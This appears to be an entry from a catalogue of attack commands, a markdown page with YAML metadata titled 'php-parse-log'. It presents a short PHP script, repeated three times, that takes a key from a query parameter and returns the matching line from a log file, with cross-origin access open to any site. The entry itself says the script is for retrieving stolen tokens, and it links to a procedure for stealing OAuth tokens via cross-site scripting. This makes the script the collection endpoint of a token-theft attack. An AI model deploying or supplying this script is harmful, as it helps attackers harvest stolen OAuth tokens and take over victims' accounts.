---
data: >-
  <?php header("Access-Control-Allow-Origin: *"); header("Content-type:
  text/plain"); $key= @$_GET['q'];
  if(!$key||!preg_match('#^[a-f0-9]{48}$#',$key)){die;}
  $data=explode("\n",file_get_contents('r.log')); foreach($data as $line){
  if(strpos($line,$key)!==false){ echo $line."\n"; die; } } ?>
tags:
  - logging
  - parsing
type: command
executor: php
platforms:
  - Web
id: fa579a79-1a99-4238-ac55-5b34ca8a2b0a
created_at: '2025-12-14T00:11:25.317Z'
updated_at: '2025-12-14T00:11:25.317Z'
verified: false
validated: true
submitted: true
---
# php-parse-log

## Command

```php
<?php header("Access-Control-Allow-Origin: *"); header("Content-type: text/plain"); $key= @$_GET['q']; if(!$key||!preg_match('#^[a-f0-9]{48}$#',$key)){die;} $data=explode("\n",file_get_contents('r.log')); foreach($data as $line){ if(strpos($line,$key)!==false){ echo $line."\n"; die; } } ?>
```

## Description

Parses the log file to extract and return the line matching the given state key for retrieving stolen tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `q` | State key to search for in log | Yes |

## Examples

### Basic Usage

```php
<?php header("Access-Control-Allow-Origin: *"); header("Content-type: text/plain"); $key= @$_GET['q']; if(!$key||!preg_match('#^[a-f0-9]{48}$#',$key)){die;} $data=explode("\n",file_get_contents('r.log')); foreach($data as $line){ if(strpos($line,$key)!==false){ echo $line."\n"; die; } } ?>
```

## Expected Output

The log line containing the matching state and tokens.

## Related

- [[procedures/Steal-OAuth-Tokens-via-XSS]]
